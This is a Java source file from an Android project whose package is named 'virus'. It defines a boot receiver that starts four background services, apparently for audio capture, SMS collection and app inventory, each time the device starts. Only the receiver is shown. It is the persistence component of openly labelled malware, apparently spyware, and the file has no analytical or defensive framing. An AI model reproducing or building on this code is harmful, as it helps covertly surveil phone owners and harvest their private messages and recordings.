package com.example.virus.Receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.example.virus.Services.AppInfoService;
import com.example.virus.Services.AudioService;
import com.example.virus.Services.MainService;
import com.example.virus.Services.SmsInfoService;

public class BootReceiver extends BroadcastReceiver {
    @Override
   public void onReceive(Context context, Intent intent) {
        Intent mainServiceIntent = new Intent(context, MainService.class);
        Intent audioServiceIntent = new Intent(context, AudioService.class);
        Intent smsServiceIntent = new Intent(context, SmsInfoService.class);
        Intent appInfoServiceIntent = new Intent(context, AppInfoService.class);

        context.startService(mainServiceIntent);
        context.startService(audioServiceIntent);
        context.startService(smsServiceIntent);
        context.startService(appInfoServiceIntent);

    }
}
